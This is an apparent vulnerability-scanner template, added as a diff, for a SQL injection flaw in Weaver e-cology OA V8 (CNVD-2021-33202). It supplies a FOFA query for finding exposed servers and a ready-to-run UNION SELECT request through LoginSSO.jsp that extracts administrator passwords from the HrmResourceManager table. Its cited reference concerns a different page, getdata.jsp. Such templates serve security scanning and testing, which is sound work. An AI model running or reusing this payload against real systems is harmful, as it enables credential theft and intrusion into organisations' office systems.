@@ -1,0 +1,35 @@
+id: poc-local-oa-weaver-ecology-v8-LoginSSO-jsp-sqli
+
+info:
+  name: 泛微OA E-Cology LoginSSO.jsp SQL注入漏洞 CNVD-2021-33202
+  author: capiton
+  severity: high
+  description: 泛微e-cology是专为大中型企业制作的OA办公系统,支持PC端、移动端和微信端同时办公等。 泛微e-cology存在SQL注入漏洞。攻击者可利用该漏洞获取敏感信息。
+  reference:
+    - http://wiki.peiqi.tech/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20E-Cology%20getdata.jsp%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html
+  metadata:
+    fofa-query: app="泛微-协同办公OA"
+    Vulnerability-Impact: 泛微OA V8
+  tags: weaver,ecology,fanwei
+
+requests:
+  - method: GET
+    path:
+      - "{{RootURL}}/upgrade/detail.jsp/login/LoginSSO.jsp?id=1%20UNION%20SELECT%20password%20as%20id%20from%20HrmResourceManager"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        condition: and
+        status:
+          - 200
+
+      - type: word
+        part: body
+        condition: and   
+        words:  
+          - "<pre>"
+          - "</pre>"
+          - "<code>"
+          - "</code>"
+
